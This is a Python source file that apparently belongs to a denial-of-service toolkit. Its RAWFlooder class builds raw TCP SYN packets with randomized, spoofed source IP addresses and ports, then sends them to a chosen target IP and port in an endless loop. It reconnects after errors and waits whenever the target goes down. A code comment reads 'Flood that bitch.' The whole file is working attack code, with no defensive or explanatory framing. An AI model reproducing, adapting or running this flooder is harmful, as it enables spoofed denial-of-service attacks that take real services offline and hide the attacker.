from role import flooder
from time import sleep
from struct import pack
from socket import socket, inet_aton, htons
from socket import AF_INET, SOCK_RAW, IPPROTO_RAW
from socket import error as socket_error
from random import randint
from sys import exit


class RAWFlooder(flooder.Flooder):
	def __init__(self, ip, port):
		flooder.Flooder.__init__(self, ip, port)
		self.socket_type = 3
		self.socket_protocol = 6

	def run(self):
		try:
			s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)
		except socket_error:
			exit()

		# Randomize the source address
		source_ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))

		# IP header
		ip_ihl = 5
		ip_ver = 4
		ip_tos = 0
		ip_tot_len = 0
		ip_id = randint(0, 100000)
		ip_frag_off = 0
		ip_ttl = 255
		ip_proto = self.socket_protocol
		ip_check = 0
		ip_saddr = inet_aton(source_ip)
		ip_daddr = inet_aton(self.ip)
		ip_ihl_ver = (ip_ver << 4) + ip_ihl

		# Pack the IP header
		ip_header = pack(
			'!BBHHHBBH4s4s',
			ip_ihl_ver,
			ip_tos,
			ip_tot_len,
			ip_id,
			ip_frag_off,
			ip_ttl,
			ip_proto,
			ip_check,
			ip_saddr,
			ip_daddr
		)

		# TCP header
		tcp_source = randint(1, 65535)
		tcp_dest = int(self.port)
		tcp_seq = 454
		tcp_ack_seq = 0
		tcp_doff = 5

		# TCP flags
		tcp_fin = 0
		tcp_syn = 1
		tcp_rst = 0
		tcp_psh = 0
		tcp_ack = 0
		tcp_urg = 0
		tcp_window = htons(5840)
		tcp_check = 0
		tcp_urg_ptr = 0
		tcp_offset_res = (tcp_doff << 4) + 0
		tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)

		# Pack the TCP header
		tcp_header = pack(
			'!HHLLBBHHH',
			tcp_source,
			tcp_dest,
			tcp_seq,
			tcp_ack_seq,
			tcp_offset_res,
			tcp_flags,
			tcp_window,
			tcp_check,
			tcp_urg_ptr
		)

		# Pseudo header
		msg = self.get_random_message()
		source_address = inet_aton(source_ip)
		dest_address = inet_aton(self.ip)
		placeholder = 0
		tcp_length = len(tcp_header) + len(msg)

		# Pack the pseudo header
		psh = pack('!4s4sBBH', source_address, dest_address, placeholder, self.socket_protocol, tcp_length)
		psh = psh + tcp_header + pack('!' + str(len(msg)) + 's', msg)

		# Verify bytes on the pseudo header
		tcp_check = self.checksum(psh)

		# Pack the TCP header
		tcp_header = pack(
			'!HHLLBBH',
			tcp_source,
			tcp_dest,
			tcp_seq,
			tcp_ack_seq,
			tcp_offset_res,
			tcp_flags,
			tcp_window
		) + pack('H', tcp_check) + pack('!H', tcp_urg_ptr)

		packet = ip_header + tcp_header + msg

		# Flood that bitch
		try:
			while True:
				try:
					s.sendto(packet, (self.ip, int(self.port)))
				except socket_error:
					try:
						s.close()
						s = socket(AF_INET, self.socket_type)
						s.connect((self.ip, int(self.port)))
						print('Socket error...reconnecting')
					except socket_error:
						print('Target down. Waiting %s seconds before reconnecting' % 10)
						sleep(10)
		except KeyboardInterrupt:
			exit()
